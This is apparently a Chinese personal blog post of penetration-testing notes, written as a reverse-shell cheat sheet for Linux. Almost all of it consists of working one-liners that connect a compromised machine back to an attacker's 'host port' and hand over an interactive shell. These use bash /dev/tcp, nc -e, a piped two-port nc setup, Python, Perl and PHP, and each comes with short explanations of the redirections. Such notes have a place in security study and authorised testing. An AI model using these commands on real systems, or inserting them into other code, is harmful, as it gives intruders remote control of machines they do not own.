---
title: 关于反弹shell的姿势
date: 2020-03-05 15:26:53
tags:
 - shell
 - 渗透测试
categories:
 - 日常积累
---

## linux下的反弹

本机使用nc

```
nc -lvp port
```

<!--more-->

### bash

```
bash -i >& /dev/tcp/host/port 0>&1
```

> - linux shell下常用的文件描述符是：
>
>   > 1. 标准输入  (stdin) ：代码为 0 ，使用 < 或 << ； 
>   >
>   > 2. 标准输出  (stdout)：代码为 1 ，使用 > 或 >> ； 
>   >
>   > 3. 标准错误输出(stderr)：代码为 2 ，使用 2> 或 2>>。
>
> - bash -i 新开一个交互bash
>
> - \>&或者 &\>  将标准错误输出定向到标准输出中
>
> - 0>&1或者0<&1将标准输入重定向到标准输出中
>
> - /dev/tcp/host/port  使用tcp通道与host:post建立一个连接
>
> - 如果还是不清楚 参考手册https://www.gnu.org/software/bash/manual/bash.pdf 3.6 章redirections



### nc

```
nc -e /bin/bash host port
```

>nc -e   inbound program to exec [dangerous!!]



有些版本的NC没有-e选项，在本机开两个端口

```
nc -lvp port1
nc -lvp port2
```



受控机

```
nc host port1 | /bin/bash | nc host port2
```

>- 管道命令，从host:pot1输入数据交给 /bin/bash处理，再交给host：port2输出
>
>- 将nc 改成telnet 也是可以的





### python

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("host",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



### perl

```
perl -e 'use Socket;$i="host";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```



### php

```
php -r '$sock=fsockopen("host",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

> php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数





参考连接

https://www.freebuf.com/news/142195.html

https://www.freebuf.com/articles/system/147768.html

https://www.freebuf.com/articles/system/178150.html

https://www.freebuf.com/articles/system/153986.html

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet